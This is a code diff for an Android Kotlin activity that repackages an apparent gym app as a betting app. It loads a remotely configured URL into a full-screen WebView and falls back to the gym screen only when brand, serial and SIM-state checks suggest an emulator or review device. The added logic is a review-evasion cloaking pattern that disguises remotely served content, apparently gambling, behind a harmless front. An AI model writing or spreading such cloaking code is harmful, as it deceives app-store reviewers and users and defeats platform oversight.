@@ -1,7 +1,10 @@
-package com.delta.soft
+package olimp.bet.olimpbet.bk.app
 
+import android.content.Context
 import android.os.Build
 import android.os.Bundle
+import android.telephony.TelephonyManager
+import android.util.Log
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import androidx.activity.ComponentActivity
@@ -15,20 +18,36 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.viewinterop.AndroidView
-import com.delta.soft.model.ItemRowModel
+import olimp.bet.olimpbet.bk.app.R
+import olimp.bet.olimpbet.model.ItemRowModel
+
 
 class MainActivity : ComponentActivity() {
+
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        val sharedPreference = getSharedPreferences("PREFERENCE_NAME", Context.MODE_PRIVATE)
+        var editor = sharedPreference.edit()
+
+
         val url = RemoteConfigUtils.getNextButtonText()
 
+        editor.putString("url", url)
+        editor.apply()
 
         setContent {
             Surface(modifier = Modifier.fillMaxSize()) {
+                val getUrl = sharedPreference.getString("url", "defaultName")
                 if (url.isNotEmpty()) {
-                    UrlIntent(url = url)
+                    Log.d(
+                        "CheckPref",
+                        "onCreate: ${sharedPreference.getString("url", "defaultName")}"
+                    )
+
+                    UrlIntent(url = getUrl.toString())
                 } else {
-                    GymScreen()
+                    //GymScreen()
                 }
             }
         }
@@ -159,7 +178,12 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun UrlIntent(url: String) {
-        if (url.isNotEmpty() || !Build.BRAND.contains("google") || Build.SERIAL != "unknown") {
+        val telMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val simState = telMgr.simState
+
+        if (url.isNotEmpty() || !Build.BRAND.contains("google") || Build.SERIAL != "unknown"
+            || simState != TelephonyManager.SIM_STATE_ABSENT
+        ) {
             AndroidView(factory = {
                 WebView(this).apply {
                     webViewClient = WebViewClient()
@@ -167,7 +191,7 @@ class MainActivity : ComponentActivity() {
                 }
             })
         } else {
-
+            GymScreen()
         }
     }
 }
